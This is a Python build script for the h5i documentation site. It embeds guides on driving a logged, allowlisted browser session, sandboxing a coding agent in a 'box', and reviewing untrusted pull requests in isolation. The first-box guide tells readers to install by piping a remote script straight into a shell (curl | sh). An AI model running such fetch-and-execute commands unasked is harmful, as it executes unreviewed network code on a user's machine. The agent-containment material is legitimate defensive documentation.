"""Build the hand-written guides and essays into the static docs tree.

Rewrites every page it owns, which drops the `?v=` cache-busting stamps on
`_static` links, then re-stamps them before exiting. Running this on its own
leaves a consistent tree.
"""

from datetime import datetime, timezone
from pathlib import Path
import hashlib
import json
import re
import shutil
import subprocess
import sys

ROOT = Path(__file__).parent

# When the documentation rewrite published this set of pages. A real
# publication date, so it is genuinely a constant.
PUBLISHED = "2026-08-21"

# The last date each published page's content changed, beside a fingerprint of
# what it contained on that date.
#
# `lastmod` and `dateModified` are worth publishing only if they move when the
# page moves, and a single hand-maintained date does not: this file pinned
# every date on the site to the publication date and stayed there through
# thirteen commits, telling every crawler nothing had ever changed. It cannot
# be derived from git either, because CI regenerates this tree from a shallow
# checkout and byte-compares the result, so a date read from history would
# differ from the committed one and fail the build.
#
# So the date is written down, and `verify_dates()` re-derives every
# fingerprint at the end of the build and refuses to finish if one moved
# without its date. Changing a page's content and forgetting the date is a
# build error, not a silent regression.
PAGE_HISTORY = {
    "": ("2026-09-12", "e20b3d18d07021b6"),
    "features/": ("2026-09-12", "7a387af144ced01b"),
    "manual/": ("2026-09-15", "ac83a7c5f7312b95"),
    "pitch/": ("2026-09-10", "57ee2a579d40f90e"),
    "demo/": ("2026-09-12", "729de49b887b5c3f"),
    "guides/": ("2026-09-15", "1cfa5ff7f504c618"),
    "blog/": ("2026-09-15", "e6bef559cb5cc1b6"),
    "guides/recon-and-idor/": ("2026-09-15", "3724f8bf21f0170d"),
    "guides/broken-access-control/": ("2026-09-15", "dec6df369429ae8e"),
    "guides/jwt-attacks/": ("2026-09-15", "0b3fc4ae463e60f9"),
    "guides/sql-injection/": ("2026-09-15", "1347ab6ad9b35263"),
    "guides/injection-beyond-sql/": ("2026-09-15", "58420a2d971ae3a5"),
    "guides/browser-as-a-weapon/": ("2026-09-15", "5dbce398406589f6"),
    "guides/ssrf-and-file-attacks/": ("2026-09-15", "0408e264337bea37"),
    "guides/http-protocol-attacks/": ("2026-09-15", "84bfef80b24ab2b0"),
    "guides/logic-time-and-crypto/": ("2026-09-15", "6011aec60de33ecb"),
    "guides/exploit-chains/": ("2026-09-15", "e6c14587b663e935"),
    "guides/cheatsheet/": ("2026-09-15", "52500b0fb9da625d"),
    "guides/drive-a-browser-session/": ("2026-09-15", "1e924e7680870af5"),
    "guides/first-box/": ("2026-09-15", "42cb89a3f707dc02"),
    "guides/review-a-pull-request/": ("2026-09-15", "b25f2bd2fa8efe3c"),
    "guides/write-a-box-policy/": ("2026-09-15", "d459b41d585b5ac1"),
    "guides/watch-the-browser/": ("2026-09-15", "18221347ce0ba55a"),
    "guides/authorized-web-security-testing/": ("2026-09-15", "21223e318fd73f95"),
    "blog/the-h5i-loop/": ("2026-09-13", "78a64276929d8202"),
    "blog/the-environment-is-the-sandbox/": ("2026-09-13", "c0003c9a5de6bc53"),
    "blog/choosing-agent-isolation/": ("2026-09-13", "0eff3260305a64d7"),
    "blog/evidence-for-agent-work/": ("2026-09-13", "3a266f6d55c32baa"),
    "blog/prompt-injection-is-a-boundary-problem/": ("2026-09-13", "b15f2e7954362847"),
    "blog/ai-pentesting-tools/": ("2026-09-12", "812fe92f28bdb3ec"),
    "blog/burp-suite-vs-h5i-for-ai-agents/": ("2026-09-13", "7d57b8ebd6dc9467"),
    "blog/owasp-zap-vs-h5i-for-ai-agents/": ("2026-09-13", "6545e081e6a97a07"),
    "blog/caido-vs-h5i-for-ai-agents/": ("2026-09-13", "10110eb76f38b20e"),
}

# The pages this script does not write. They are fingerprinted off disk.
HAND_WRITTEN = ("", "features/", "manual/", "pitch/", "demo/")

_VOLATILE = (
    re.compile(r"\?v=[0-9a-f]+"),                                  # asset stamps
    re.compile(r"\d{4}-\d{2}-\d{2}"),                              # any ISO date
    re.compile(r"\w{3}, \d{2} \w{3} \d{4} \d{2}:\d{2}:\d{2} GMT"),  # any RSS date
)


def fingerprint(html):
    """A page's content hash, blind to the things that are not its content.

    Asset stamps move whenever a stylesheet does and dates move whenever this
    guard fires, so hashing either would make the check either too loud or
    self-triggering.
    """
    for pattern in _VOLATILE:
        html = pattern.sub("", html)
    return hashlib.sha256(html.encode()).hexdigest()[:16]


def modified(path):
    """The recorded last-changed date for a published page."""
    return PAGE_HISTORY[path][0]


def verify_dates(generated):
    """Refuse to finish a build that changed a page without dating the change."""
    today = datetime.now(timezone.utc).date().isoformat()
    seen = dict(generated)
    for path in HAND_WRITTEN:
        seen[path] = (ROOT / path / "index.html").read_text()

    stale = []
    for path, html in sorted(seen.items()):
        recorded_date, recorded_hash = PAGE_HISTORY[path]
        actual = fingerprint(html)
        if actual != recorded_hash:
            stale.append((path, recorded_date, actual))
    if not stale:
        return

    print("docs: page content changed without a date to go with it.\n", file=sys.stderr)
    print("Update PAGE_HISTORY in docs/build-content.py, then rebuild:\n", file=sys.stderr)
    for path, recorded_date, actual in stale:
        was = "" if recorded_date == today else f"   # was {recorded_date}"
        print(f'    "{path}": ("{today}", "{actual}"),{was}', file=sys.stderr)
    print(f"\nThese dates become <lastmod> in sitemap.xml and dateModified in the", file=sys.stderr)
    print("page schema, so they have to describe the content actually shipping.", file=sys.stderr)
    sys.exit(1)


def rfc822(day):
    """A YYYY-MM-DD date as the RFC-822 stamp RSS requires."""
    stamp = datetime.strptime(day, "%Y-%m-%d").replace(hour=12, tzinfo=timezone.utc)
    return stamp.strftime("%a, %d %b %Y %H:%M:%S GMT")

NAV = """<nav class="blog-nav">
  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
  <ul class="nav-links">
    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
  </ul>
</nav>"""

FOOTER = """<footer class="blog-footer"><div class="blog-footer-inner">
  <div class="brand">h5i<span class="red"> / high-five</span></div>
  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
</div></footer>
<script src="/_static/blog.js" defer></script><script src="/_static/highlight.js" defer></script>"""


# One social card for the whole generated tree, and the one sentence that
# describes it. An og:image without an og:image:alt is an unlabelled image
# everywhere the card is rendered.
SOCIAL_IMAGE = "https://h5i.dev/_static/sandboxed-browser-ui.png"
SOCIAL_ALT = ("An h5i browser session: the page an AI agent is reading, beside the "
              "request log the engine wrote before any bytes moved")


def head(title, description, canonical, schema, kind="article", rss=False,
         social_image=SOCIAL_IMAGE, social_alt=SOCIAL_ALT):
    data = json.dumps(schema, indent=2, ensure_ascii=False).replace("</", "<\\/")
    feed = '<link rel="alternate" type="application/rss+xml" title="The h5i Blog" href="/feed.xml">' if rss else ""
    return f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title}</title><meta name="description" content="{description}">
<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
<link rel="canonical" href="{canonical}">{feed}<link rel="icon" type="image/png" href="/_static/logo.png">
<meta property="og:type" content="{kind}"><meta property="og:site_name" content="h5i">
<meta property="og:title" content="{title}"><meta property="og:description" content="{description}">
<meta property="og:url" content="{canonical}"><meta property="og:image" content="{social_image}">
<meta property="og:image:alt" content="{social_alt}"><meta property="og:locale" content="en_US">
<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="{title}">
<meta name="twitter:description" content="{description}"><meta name="twitter:image" content="{social_image}">
<meta name="twitter:image:alt" content="{social_alt}">
<script type="application/ld+json">{data}</script>
<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
<link rel="stylesheet" href="/_static/blog.css"><link rel="stylesheet" href="/_static/highlight.css">
</head>"""


def terminal(label, text):
    # Escape the body. Every angle bracket in these blocks is a placeholder a
    # reader is meant to see (`<thread>`, `<digest>`), and an unescaped one is
    # parsed as an unknown element and rendered as nothing, which silently
    # drops the argument from a command somebody is about to copy.
    body = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return f"""<div class="terminal"><div class="terminal-bar"><span class="terminal-path">{label}</span></div>
<div class="terminal-body"><pre><code>{body}</code></pre></div></div>"""


def schema_for(item):
    url = f"https://h5i.dev/{item['section']}/{item['slug']}/"
    graph = [
        {"@type": "TechArticle", "headline": item["h1"], "description": meta_description(item),
         "author": {"@type": "Organization", "name": "h5i-dev"},
         "publisher": {"@type": "Organization", "name": "h5i"},
         "datePublished": item.get("published", PUBLISHED),
         "dateModified": modified(f"{item['section']}/{item['slug']}/"),
         "image": item.get("social_image", SOCIAL_IMAGE), "inLanguage": "en", "isPartOf": {"@id": "https://h5i.dev/#website"},
         "mainEntityOfPage": url},
        {"@type": "BreadcrumbList", "itemListElement": [
            {"@type": "ListItem", "position": 1, "name": "Home", "item": "https://h5i.dev/"},
            {"@type": "ListItem", "position": 2, "name": item["section"].title(), "item": f"https://h5i.dev/{item['section']}/"},
            {"@type": "ListItem", "position": 3, "name": item["h1"], "item": url},
        ]},
    ]
    if item.get("faq"):
        graph.append({"@type": "FAQPage", "mainEntity": [
            {"@type": "Question", "name": q, "acceptedAnswer": {"@type": "Answer", "text": a}}
            for q, a in item["faq"]
        ]})
    return {"@context": "https://schema.org", "@graph": graph}


def meta_description(item):
    """The search-snippet line for a page.

    `description` doubles as the visible card blurb and the RSS summary, where
    a long sentence is worth having. A snippet is cut around 160 characters, so
    a page whose blurb runs past that carries a `meta` line written to fit.
    """
    return item.get("meta", item["description"])


def article_page(item):
    url = f"https://h5i.dev/{item['section']}/{item['slug']}/"
    faq = "".join(
        f'<details class="faq-item"><summary>{q}</summary><div class="faq-answer">{a}</div></details>'
        for q, a in item.get("faq", ())
    )
    faq = f'<h2 id="faq">Questions that come up</h2><div class="faq-list">{faq}</div>' if faq else ""
    nxt = item["next"]
    return f"""{head(item['title'], meta_description(item), url, schema_for(item),
                    social_image=item.get('social_image', SOCIAL_IMAGE),
                    social_alt=item.get('social_alt', SOCIAL_ALT))}
<body>{NAV}<main class="article-wrap"><article class="post">
<header><div class="post-eyebrow">{item['eyebrow']} &middot; {item.get('published', PUBLISHED)}</div>
<h1>{item['h1']}</h1><p class="post-deck">{item['deck']}</p>
<div class="post-meta"><span>{item['time']} read</span><span>{item['tags']}</span></div></header>
{item['body']}
{faq}
<a class="next-up" href="{nxt[0]}"><span class="label">{nxt[1]}</span><h3>{nxt[2]}</h3><p>{nxt[3]}</p></a>
<div class="post-cta"><h3>{item['cta'][0]}</h3><p>{item['cta'][1]}</p>
<div class="hero-actions"><a class="btn btn-primary" href="{item['cta'][2]}">{item['cta'][3]}</a></div></div>
</article></main>{FOOTER}</body></html>"""


SESSION = {
    "section": "guides", "slug": "drive-a-browser-session", "eyebrow": "Guide 01 / Start here",
    "time": "8 min", "tags": "Session &middot; Snapshot &middot; Request log",
    "title": "Drive an h5i browser session | h5i",
    "h1": "Open a session and read what it reached",
    "description": "Open an h5i browser session, drive a page by @ref handle, then audit the fail-closed request log the engine wrote before any bytes moved.",
    "deck": "Driving a browser and observing one are different jobs. This guide does both in one sitting: act on a page by handle, then read back the decision record the engine wrote as it went.",
    "body": f"""
<div class="callout"><strong>Outcome.</strong> In about ten minutes you will open a session, read a page as a model reads it, act on it, watch a request get refused by policy, and read the log that proves what did and did not reach the network.</div>
<p>A session is the whole agent-facing surface: one page state, one cookie jar, one request log, one policy. <code>open</code> makes one, every verb that follows acts on it, <code>close</code> ends it. You do not type a session id: the opaque one in <code>--json</code> and in the receipts is a durable reference, not an interface. Nothing else is a concept the agent has to learn, which is what lets the placement change later without changing a single command.</p>
<h2 id="start">1. Open a session</h2>
{terminal('host', '$ h5i browser open https://docs.rs/ --allow docs.rs')}
<p>Read the two lines it prints back before anything else. The placement line says where this session runs, and the requests line says who saw its network. Both are printed on every status afterwards, so you never have to infer either.</p>
{terminal('what it answers', "placed   : this machine (no containment beyond the engine)\nrequests : engine-claimed (fail-closed, and the engine's own account of what it fetched)")}
<p>That first line is the honest one. A session started this way is not sandboxed, and h5i says so rather than letting the word browser imply a boundary. What you get without one is the record.</p>
<h2 id="read">2. Read the page the way a model reads it</h2>
{terminal('host', '$ h5i browser snapshot')}
<p>What comes back is an outline with <code>@ref</code> handles rather than pixels or raw HTML: headings, paragraphs, and the things that can be acted on, each with a handle to act on it by. It arrives inside a fence marking everything within as page content, which is the difference between text the model treats as information and text it treats as an instruction.</p>
<p>Two things are stripped on the way through, both because the page composed them. Escape sequences never survive: <code>ESC</code> in a page title is a page repainting the terminal it is printed into, and nothing a browser has to say needs one. Long values are capped with the truncation stated in the value, because an answer silently shortened is one an agent reasons about as if it were complete.</p>
<h2 id="act">3. Act by handle, not by guess</h2>
{terminal('host', '$ h5i browser click @e3\n$ h5i browser snapshot --delta\n$ h5i browser type @e5 "serde"\n$ h5i browser submit @e5')}
<p>Use <code>--delta</code> once the loop is running. Re-reading three hundred lines after every click is the wrong shape for an agent, and when the page has changed too much for a difference to be the shorter answer the full outline arrives instead and the reply says which it is.</p>
<p>A handle from a reading the page has moved on from is refused rather than resolved against whatever now sits in that position. That refusal is the feature: a mis-click on a page that changed underneath is the failure that is hardest to see afterwards.</p>
<h2 id="refused">4. Watch a request get refused</h2>
<p>The session was started with one origin allowed. Follow a link that leaves it.</p>
{terminal('host', '$ h5i browser click @e9\ndenied by policy: origin `https://tracker.example` is not in the allowlist')}
<p>Redirects are checked at every hop, so a server cannot route the session out of its allowlist by answering with a <code>302</code>. The refusal is an answer with a reason, not a silent no-op, and it is in the log.</p>
<h2 id="audit">5. Read back what it reached</h2>
{terminal('host', '$ h5i browser requests')}
<p>This is the part that is different. The engine <em>is</em> the HTTP client, so this list is a decision record it wrote before the bytes moved rather than a trace assembled beside the network. The order is fixed: check the policy, write the record, then touch the wire. When the record cannot be written, the fetch is refused.</p>
<p>Two consequences worth stating plainly. A request that is not in this list did not happen. And a denied request <em>is</em> in the list, with its reason, so the log shows what was attempted and not only what succeeded.</p>
<p>Pass the <code>cursor</code> from a previous answer back as <code>--since</code> to see only what is new, the same way <code>--delta</code> works on a snapshot.</p>
<h2 id="audit">6. Read the whole session back</h2>
<p><code>requests</code> is the network layer, and the verb to poll inside a loop. When you are writing up what happened, read the timeline instead.</p>
{terminal('host', '$ h5i browser audit')}
<p>It merges three sources: the verbs you asked for, the decision the engine made about every fetch, and the moments a human took the controls. Ordered across all of them, so the question a review actually asks &mdash; was a person driving when that form was submitted &mdash; has an answer. A current-holder field cannot give one.</p>
<p>Every row says which lane it came from. The engine&rsquo;s rows are its own account of itself; the handovers and the ending are h5i&rsquo;s, written from outside. They are printed apart because a claim rendered as an observation is the one error this product cannot afford.</p>
<p>Read the <code>sources</code> line before the rows. Each log is <code>read</code>, <code>empty</code>, or <code>unavailable</code>. An empty timeline over a log h5i could not see looks exactly like a session that did nothing, and those are different findings.</p>
<h2 id="end">7. End it, and keep the record</h2>
{terminal('host', '$ h5i browser close\n$ h5i browser list --all')}
<p>Closing writes the ending into the session's record instead of deleting it, which is what makes &ldquo;how did this end&rdquo; answerable afterwards and what makes the id impossible to reuse. The states are <code>closed</code>, <code>died</code>, <code>expired</code> and <code>evicted</code>, and they are kept apart because they are different facts about the run.</p>
<p>Send a verb to a session that is not live and it is refused with exit code 69 rather than silently restarted. That distinct code is the point of the design: an agent whose retry cannot tell &ldquo;the session is gone&rdquo; from &ldquo;the click did not work&rdquo; quietly starts a second browser and loses both the page it was reasoning about and the record of losing it.</p>
<h2 id="contain">8. When you want a boundary too</h2>
{terminal('host', '$ h5i box --profile browser --engine h5i --name web\n$ h5i browser open https://example.com --in web')}
<p>Every verb above works unchanged. What changes is the requests line: the box enforces its egress allowlist at its own boundary, outside the browser being described, so the lane goes from <code>engine-claimed</code> to <code>host-observed</code>.</p>
<p>Being inside a box does not earn that on its own. A box whose policy lets the browser reach the whole network corroborates nothing, and h5i keeps calling that session <code>engine-claimed</code>. What earns the upgrade is enforcement outside the engine.</p>
<h2 id="sources">Reference</h2>
<ul><li><a href="/manual/#h5i-browser">The session reference: verbs, states, and where sessions live</a>.</li><li><a href="/guides/watch-the-browser/">Watch the page, then take the controls</a>.</li><li><a href="/blog/prompt-injection-is-a-boundary-problem/">Why browser authority changes the injection threat model</a>.</li><li><a href="https://github.com/h5i-dev/h5i/tree/main/crates/h5i-browser">The engine implementation</a>.</li></ul>""",
    "faq": [
        ("Is the session sandboxed?", "Not by default, and h5i does not claim it is. A session started with no flags runs in your ordinary process space like any other headless browser. The placement line says so on every status. Containment is the --in flag, which places the same session inside a box without changing any verb."),
        ("What does engine-claimed mean?", "It is the browser's own account of what it fetched: fail-closed, complete, and still the browser describing itself. host-observed means h5i also saw the traffic at a box's boundary, outside the browser. h5i never merges the two labels."),
        ("What happens if the browser dies mid-task?", "The session is recorded as died, with a time, and the next verb exits 69. Nothing restarts automatically. Use --restore to carry the old session's storage into a new session with a new id; the inheritance is written into the new record and the old id is never reused."),
        ("Does the engine run page JavaScript?", "Only if you ask for it with --script. Off is the default because with no script realm there is no delivery channel for page-borne injection at all. Turning it on is a decision, not a default you inherit."),
    ],
    "next": ("/guides/authorized-web-security-testing/", "Next guide", "Run an authorized web security test with an AI agent", "Scope the session to a target you may test, then capture, replay, and compare its traffic."),
    "cta": ("Open a session in one command", "No project, no repository, no configuration. h5i browser open takes a URL and gives you an id.", "/manual/#h5i-browser", "Read the session reference"),
}


FIRST_BOX = {
    "section": "guides", "slug": "first-box", "eyebrow": "Guide 03 / The box",
    "time": "9 min", "tags": "Install &middot; Create &middot; Export",
    "title": "Your first h5i box | h5i",
    "h1": "Take one coding task from prompt to reviewed patch",
    "description": "Create your first h5i sandbox, run an agent inside it, inspect the diff and execution record, then export or apply the result.",
    "deck": "The useful unit is not a sandboxed command. It is the whole coding session: repository, agent, shell, dependencies, dev server, and browser inside one disposable boundary.",
    "body": f"""
<div class="callout"><strong>Outcome.</strong> In about ten minutes you will create a named box, work inside it, inspect what changed and what ran, then choose whether the patch leaves the boundary.</div>
<figure class="feature-figure"><img src="/_static/fast-supervised-sandbox.svg" alt="One h5i command creates a supervised box with filesystem, syscall, network, and resource controls around the agent workload"><figcaption>The first run should establish the mental model: one command creates the environment; every agent child stays inside; evidence and a patch come back out.</figcaption></figure>
<h2 id="before">Before you start</h2>
<p>Use a Git repository with a clean enough baseline that you can recognize the agent's change. You do not need Podman or a microVM runtime for the first box. h5i can use its lightweight host-kernel tiers when the operating system supports them.</p>
<p>Choose one agent runtime. The guide shows Claude Code; Codex works the same way with the runtime-specific profile and command changed. One runtime per box keeps HOME state, API routing, and credential handling narrow.</p>
<h2 id="install">1. Install h5i and check the host</h2>
<p>Install the single binary, then ask it what this machine can actually enforce. <code>probe</code> performs a functional check; it does not infer support from the operating-system name.</p>
{terminal('host', '''$ curl -fsSL https://h5i.dev/install.sh | sh
$ h5i box probe
$ h5i skill install''')}
<p>The skill teaches a supported coding agent how to operate the box. It is embedded in the binary, so its commands match the version you installed.</p>
<h2 id="create">2. Create a box from the current repository</h2>
{terminal('repository root', '''$ h5i box create first-box --from HEAD --profile agent-claude
$ h5i box status first-box''')}
<p>Creation freezes the base revision and resolves the policy before the workspace exists. Read the status once. It names the isolation tier, filesystem grants, network policy, resource limits, and policy digest that the receipts will carry.</p>
<p>Do not skip that output on the first run. Find the answers to four questions: which tier was selected, whether the box shares the host kernel, which paths are writable, and how network access is scoped. The point is to verify the claim before asking the agent to do useful work.</p>
{terminal('what to record', '''box       first-box
base      <frozen commit>
profile   agent-claude
isolation <resolved tier>
policy    sha256:<digest>
write     $WORK only''')}
<div class="callout warn"><strong>Use the runtime-specific profile.</strong> Choose <code>agent-claude</code> or <code>agent-codex</code>. A box should not receive two runtimes' configuration or credential routes.</div>
<h2 id="work">3. Work inside the boundary</h2>
{terminal('host, then box', '''$ h5i box shell first-box
box$ claude
# Ask for one concrete change. Let the agent edit, build, and test.
box$ exit''')}
<p><code>shell</code> is the boundary. Every child process inherits it, including package scripts and test runners. You do not need to remember to wrap each command.</p>
<p>For a single deterministic check, skip the interactive shell:</p>
{terminal('host', '''$ h5i box run first-box -- cargo test
$ h5i box run first-box -- npm test''')}
<h2 id="inspect">4. Inspect before you export</h2>
{terminal('host', '''$ h5i box diff first-box --stat
$ h5i box diff first-box
$ h5i box log first-box
$ h5i box status first-box''')}
<p>Use the diff to review the result and the log to review the execution. They answer different questions. A clean patch does not prove that tests ran; a successful test does not make an unrelated edit acceptable.</p>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Question</th><th>Command</th><th>Signal</th></tr></thead><tbody>
<tr><th>What changed?</th><td><code>box diff</code></td><td>Unexpected files, generated output, dependency drift</td></tr>
<tr><th>What ran?</th><td><code>box log</code></td><td>Missing tests, nonzero exits, repeated retries</td></tr>
<tr><th>What governed it?</th><td><code>box status</code></td><td>Tier, grants, resource caps, policy digest</td></tr>
<tr><th>Can the claim still hold?</th><td><code>box doctor</code></td><td>Broken refs, missing runtime prerequisites, policy mismatch</td></tr>
</tbody></table></div>
<h2 id="export">5. Move the result through the output gate</h2>
{terminal('host', '''$ h5i box export first-box --out ./review-first-box
$ git apply --check ./review-first-box/patch.diff
$ less ./review-first-box/report.md''')}
<p>The export contains <code>patch.diff</code>, <code>report.md</code>, and <code>receipt.json</code>. The patch is path-validated. The report puts denied egress and failed execution ahead of the agent's own proposal.</p>
<p>If this is a local box and you want h5i to land the work directly, freeze it first:</p>
{terminal('host', '''$ h5i box propose first-box
$ h5i box apply first-box''')}
<h2 id="finish">6. Remove the box when the decision is made</h2>
{terminal('host', '''$ h5i box rm first-box
$ h5i box gc''')}
<p>A box is cheap because it is disposable. Keep the export. Remove the execution environment.</p>
<h2 id="failure-modes">If the first run fails</h2>
<h3>The requested tier is unavailable</h3>
<p>Run <code>h5i box probe</code> and read the reason. An explicit tier fails rather than falling back. Either satisfy the prerequisite or choose a tier whose stated boundary fits the task; do not translate refusal into “turn security off.”</p>
<h3>A build cannot download dependencies</h3>
<p>The default profile may have no network. Add only the registry destinations the build needs in a repository profile, or prepare a read-only warm cache. A denied telemetry endpoint is not automatically a missing dependency.</p>
<h3>The agent cannot find its login</h3>
<p>Check that the profile matches the runtime and run <code>h5i box secrets first-box</code>. It shows resolution state without printing values. Do not solve the problem by copying a whole host HOME into the box.</p>
<h3>Apply refuses</h3>
<p>Only local worktree boxes can use the mediated propose/apply path. Boxes created from a pull request, clone URL, or empty repository are detached; export the patch and apply it explicitly where you want it.</p>
<h2 id="first-review">What “done” looks like</h2>
<p>Your first run is successful when you can explain the boundary and the result separately. You should know which tier ran, which test exits were observed, which destinations were denied, and which exact patch you are choosing to take. The agent's summary is helpful, but none of those answers should depend on trusting it.</p>
<h2 id="sources">Reference</h2>
<ul><li><a href="/manual/#install">Installation and skill setup</a>.</li><li><a href="/manual/#h5i-box">The complete box command reference</a>.</li><li><a href="/manual/#h5i-box-export">Export bundle semantics and review order</a>.</li><li><a href="/blog/the-environment-is-the-sandbox/">Why the complete environment is the isolation unit</a>.</li></ul>""",
    "faq": [
        ("Does h5i change my current checkout?", "A box created from the current repository uses its own Git worktree and branch. Your current checkout is not where the agent works. Only an explicit apply step lands a proposed local change."),
        ("Which isolation tier should I use first?", "Leave the tier on auto for the first run, then read h5i box status. An explicit tier fails closed if the host cannot provide it; h5i never silently substitutes a weaker tier."),
        ("Can I use Codex instead of Claude Code?", "Yes. Replace agent-claude with agent-codex and run codex inside the shell. Keep one runtime per box so credentials and configuration remain scoped."),
    ],
    "next": ("/guides/review-a-pull-request/", "Next guide", "Run an untrusted pull request", "Use a detached box when the code did not originate in your repository."),
    "cta": ("Make the box the default place agents work", "The boundary only helps when the whole session starts inside it.", "/manual/#h5i-box", "Open the box reference"),
}


REVIEW_PR = {
    "section": "guides", "slug": "review-a-pull-request", "eyebrow": "Guide 06 / Untrusted code",
    "time": "9 min", "tags": "Pull request &middot; Detached box &middot; Review",
    "title": "Review a pull request in an h5i box | h5i",
    "h1": "Run the pull request before you trust the pull request",
    "description": "Fetch an untrusted pull request into a detached h5i box, build and exercise it, inspect denied activity, and export a review bundle.",
    "deck": "A diff shows the final tree. It cannot show what an install script attempted, what the branch contacted, or whether the tests ever ran. A detached box lets you find out without giving the branch your machine.",
    "body": f"""
<div class="callout"><strong>Boundary first.</strong> A pull-request box gets its own repository, drops the inherited <code>origin</code>, and cannot be applied or rebased into the parent. External code leaves only through <code>export</code>.</div>
<figure class="feature-figure"><img src="/_static/review-untrusted-repo.svg" alt="A malicious repository runs inside an h5i box with no host API key, default-deny network, and workspace-only filesystem access"><figcaption>The assumption is deliberately hostile: repository hooks and package scripts may execute. Their authority is the box's authority, not the developer account's.</figcaption></figure>
<p>A pull request is executable input long before you run its application. Package manifests select install hooks. Build files select plugins. Test fixtures feed parsers. Editor and agent configuration can alter startup behavior. “I only want to read the diff” stops being true the moment a realistic review builds the branch.</p>
<h2 id="create">1. Create a detached box</h2>
{terminal('repository root', '''$ h5i box create review-1234 --pr 1234 --profile agent-claude
$ h5i box status review-1234''')}
<p><code>--pr</code> accepts a number, <code>#number</code>, or pull-request URL. h5i fetches the head on the host, pins it, then gives the box an independent repository with no inherited network remote.</p>
<p>The host-side fetch uses access you already have, then ends. The box receives Git objects and a pinned revision—not the SSH agent, GitHub token, or a remote it can push to. This split lets private repositories be reviewed without turning repository access into a standing capability inside untrusted code.</p>
<h2 id="baseline">2. Read the boundary before the branch</h2>
<p>Confirm three things in <code>status</code>: the box is detached, the requested isolation tier is enforced, and network access is no broader than the review needs. Do this before running a package manager; install hooks are code execution.</p>
{terminal('host', '''$ h5i box capabilities review-1234 --json
$ h5i box secrets review-1234''')}
<p><code>secrets</code> shows declared grants and dry-run resolution, never secret values. A review that needs no authenticated service should have no grant.</p>
<p>Also verify that <code>origin</code> is absent inside the box. Dropping the remote is not a complete network control, but it removes a ready-made authenticated handle and makes the detached shape obvious to tools that inspect Git configuration.</p>
<h2 id="run">3. Build and test inside the box</h2>
{terminal('host, then box', '''$ h5i box shell review-1234
box$ npm ci
box$ npm test
box$ npm run dev
# In another host terminal: h5i box view review-1234
box$ exit''')}
<p>Use the project's real install and test commands. If it is a web change, start the server in the same session and drive the isolated browser. The app, browser, and agent then agree on what <code>localhost</code> means.</p>
<p>Test the claim the pull request makes, not merely the command its author suggests. A dependency change deserves an install from the pinned lockfile. A migration deserves a disposable database. A browser fix deserves console and failed-request evidence, not only a screenshot. The box makes destructive setup cheap enough to reproduce instead of infer.</p>
<h2 id="review">4. Review evidence in the right order</h2>
{terminal('host', '''$ h5i box export review-1234 --out ./review-1234
$ less ./review-1234/report.md
$ less ./review-1234/patch.diff''')}
<p>Read the report before the prose supplied by the author or agent:</p>
<ol><li>Denied egress attempts. Unexpected destinations deserve an explanation first.</li><li>Commands and exit codes. Check that the meaningful tests ran.</li><li>Browser errors and failed requests. A visually plausible page can still be broken.</li><li>The patch. Now read the code with the execution history beside it.</li><li>The proposal. Treat it as testimony, not evidence.</li></ol>
<div class="callout warn"><strong>Absence needs a label.</strong> The <code>microvm</code> network stack can enforce an allowlist without producing a per-request egress tally. A missing summary at that tier does not mean no connection was attempted.</div>
<h2 id="finish">5. Keep the bundle, discard the box</h2>
{terminal('host', '''$ h5i box rm review-1234
$ h5i box gc''')}
<p>You can apply an accepted patch wherever you choose with <code>git apply --3way</code>. h5i refuses <code>box apply</code> for this detached box by design.</p>
<h2 id="signals">Signals that deserve a second look</h2>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Signal</th><th>Benign explanation</th><th>Review question</th></tr></thead><tbody>
<tr><th>Denied telemetry host</th><td>A dependency phones home by default</td><td>Does this dependency belong in the change?</td></tr>
<tr><th>Test exits zero unusually fast</th><td>Cache hit or focused test target</td><td>Did the meaningful suite actually execute?</td></tr>
<tr><th>Generated file outside expected tree</th><td>Build tooling creates metadata</td><td>Is it required, reproducible, and safe to apply?</td></tr>
<tr><th>Browser has no captured evidence</th><td>No browser was started</td><td>Was the user-visible behavior exercised at all?</td></tr>
<tr><th>Agent proposal omits a failed run</th><td>The agent retried and summarized the final state</td><td>What changed between failure and success?</td></tr>
</tbody></table></div>
<p>None of these is a verdict. They are attention routing. A useful report helps a reviewer spend time where the branch's behavior diverged from its story.</p>
<h2 id="detached">Why detached is stronger than “remember not to merge”</h2>
<p>The command surface itself refuses <code>apply</code> and <code>rebase</code> for external sources. That turns repository origin into a type-level lifecycle decision. An agent or hurried reviewer cannot accidentally use the convenient local landing path on code that arrived from somewhere else.</p>
<p>Export remains available because review still needs an outcome. Its patch passes path validation before leaving: symlink escapes, nested Git repositories, and agent-introduced gitlinks are rejected. You can inspect the bundle, move it elsewhere, or discard it with no mutation to the parent repository.</p>
<h2 id="troubleshoot">Common review failures</h2>
<p>If the pull-request ref cannot be fetched, use the full URL and confirm the host—not the box—has repository access. If dependency installation is denied, add the exact registry hosts to a review profile rather than switching to host networking. If the application needs a service, declare or start it inside the same session so the review does not silently depend on a host database.</p>
<h2 id="sources">Reference</h2>
